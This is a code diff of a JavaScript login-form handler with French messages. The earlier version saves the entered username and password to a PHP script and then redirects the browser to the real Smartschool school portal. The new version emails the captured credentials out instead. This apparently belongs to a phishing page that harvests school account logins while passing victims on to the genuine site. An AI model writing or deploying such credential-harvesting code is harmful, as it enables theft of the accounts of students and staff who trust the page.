@@ -1,31 +1,22 @@
 function submitForm(event) {
-    event.preventDefault(); // Empêche le rechargement de la page
-
+    event.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const data = {
-        username: username,
-        password: password
-    };
-
-    // Save data to saveData.php
-    fetch('saveData.php', {
+    fetch('send_email.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify(data)
+        body: JSON.stringify({ username, password })
     })
-    .then(response => response.text())
+    .then(response => response.json())
     .then(data => {
-        console.log('Données envoyées avec succès:', data);
-       
-       
+        if (data.success) {
+            console.log('Login envoyé par email avec succès!');
+        } else {
+            console.error('Erreur lors de l\'envoi de l\'email: ' + data.message);
+        }
     })
-    .catch(error => {
-        console.error('Erreur:', error);
-    });
-        window.location.href = "https://ebr-secondaire.smartschool.be";
+    .catch(error => console.error('Error:', error));
 }
-
